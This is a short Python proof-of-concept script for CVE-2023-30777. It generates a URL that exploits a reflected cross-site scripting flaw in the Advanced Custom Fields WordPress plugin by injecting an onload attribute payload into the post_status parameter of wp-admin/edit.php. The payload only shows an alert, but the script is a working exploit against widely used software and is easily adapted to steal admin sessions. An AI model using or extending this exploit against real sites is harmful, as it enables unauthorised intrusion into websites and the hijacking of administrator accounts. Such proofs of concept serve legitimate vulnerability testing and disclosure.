"""
CVE-2023-30777
Proof of Concept (PoC) URL generator for a reflected XSS vulnerability in the Advanced Custom Fields WordPress plugin.
by: Alucard0x1
Please use responsibly on systems where you have explicit permission to do so.
"""

import urllib.parse

def create_poc_url(wordpress_site):
    payload = 'xxxxxxx" onload=alert(document.domain) xxx'
    query_params = {
        'post_type': 'acf-field-group',
        'post_status': payload
    }
    return f"{wordpress_site}/wp-admin/edit.php?{urllib.parse.urlencode(query_params)}"

wordpress_site = "http://<Your_WordPress_Site>"
print(create_poc_url(wordpress_site))